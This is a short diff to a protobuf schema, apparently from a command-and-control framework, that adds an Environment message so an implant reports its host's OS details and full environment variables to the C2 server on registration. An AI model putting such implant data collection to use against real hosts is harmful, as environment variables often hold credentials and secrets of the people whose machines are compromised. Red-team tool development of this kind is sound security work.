@@ -38,10 +38,11 @@ message Info {
         string Version = 10;
         uint32 WorkspaceID = 12; 
 
-        repeated transport.Transport Transports = 14;          // Available C2 transports
-        repeated ghost.core.NetInterface Interfaces = 15;      // Network
-        repeated ghost.core.SocketTabEntry Netstat = 18;       // Maybe we can use this to automatically devise some better ports to use for routing/etc
-        repeated transport.route.Route Routes = 19;            // We might send current route listeners, in case.
+        repeated transport.Transport Transports = 14;       // Available C2 transports
+        repeated ghost.core.NetInterface Interfaces = 15;   // Network
+        repeated ghost.core.SocketTabEntry Netstat = 18;    // Maybe we can use this to automatically devise some better ports to use for routing/etc
+        repeated transport.route.Route Routes = 19;         // We might send current route listeners, in case.
+        Environment Environment = 20;                       // Environment variables
 }
 
 // Register - Implant calls back to C2 Server and sends its information.
@@ -65,4 +66,13 @@ message Kill {
         bool Success = 1;
         string Warning = 2; // If force kill, will kill anyway but send a warning instead of an error
         string Err = 3;     // Sends an error if kill was not force and there things still running
+}
+
+
+// Environment - Provides the set of Environment variables on a remote host
+message Environment {
+        uint32 HostID = 1;              // Maybe a bit of OS info can be useful
+        string OSName = 2;
+        string OSSp = 3;
+        map<string, string> Vars = 4;   // Actual variables
 }
